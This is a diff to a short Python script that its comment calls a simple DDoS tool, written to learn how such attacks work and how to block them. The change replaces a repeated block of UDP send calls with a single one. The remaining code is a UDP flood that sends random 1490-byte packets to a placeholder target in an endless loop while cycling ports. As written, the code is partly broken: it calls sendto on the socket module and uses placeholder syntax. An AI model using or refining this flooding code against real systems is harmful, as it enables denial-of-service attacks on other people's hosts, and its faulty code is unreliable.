@@ -2,7 +2,6 @@
 #  Simple DDoS-Attack tool for my own machine to test how to block and learn how simple DDoS attack works.
 #  Since Python is not efficient for high-rate networking, it cannot generate enough packets for a working DDoS simulation. My prototype DDoS tool might be in C or C++ in the future.
 #  Published: 09/10/2025
-
 import socket
 import random
 
@@ -12,35 +11,7 @@ data = random._urandom(1490)
 ip = <"SET_IP">
 port = <"SET_PORT">
 
-sent = 0 
-
 while True:
-  socket.sendto(data, (ip,int(port))) # spamming this two lines might be minor, but want to make it a efficent as possible
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-  socket.sendto(data, (ip,int(port)))
-  port += 1
-
+  socket.sendto(data, (ip,int(port))) 
   if port == 65534:
     port = 1
